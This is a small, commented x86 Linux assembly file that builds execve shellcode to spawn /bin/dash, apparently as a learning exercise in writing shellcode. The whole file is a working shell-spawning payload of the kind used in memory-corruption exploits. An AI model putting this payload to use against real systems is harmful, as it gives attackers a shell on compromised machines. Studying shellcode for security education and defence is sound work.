
; SHELLCODE: "\x90\x90\x90..."

global _start
_start:
    ;----------------------------------
    xor eax, eax ; clean eax registry
    push eax ; push null byte onto stack so we can mark the end of the string
    ; "/bin/dash" has 9 chars and is not divisible by 4, so we use "////bin/dash" to have 12 bytes in total
    push 0x68736164 ; dash -> 64 61 73 68 --(little endian)--> 0x68736164
    push 0x2F6E6962 ; bin/ --> 0x2F6E6962
    push 0x2F2F2F2F ; //// --> 2F2F2F2F
    mov ebx, esp ; ebx to output cmd
    ; mov ecx, eax
    push eax ; null byte to mark end of string
    push ebx ; & of file as argument
    mov ecx, esp ; mark the top of the stack
    mov edx, eax ; no args
    mov al, 0xb ; execve syscall
    int 0x80 ; call kernel
    mov eax, 1 ; exit syscall
    int 0x80
    ; ------------ End of file ------------ 
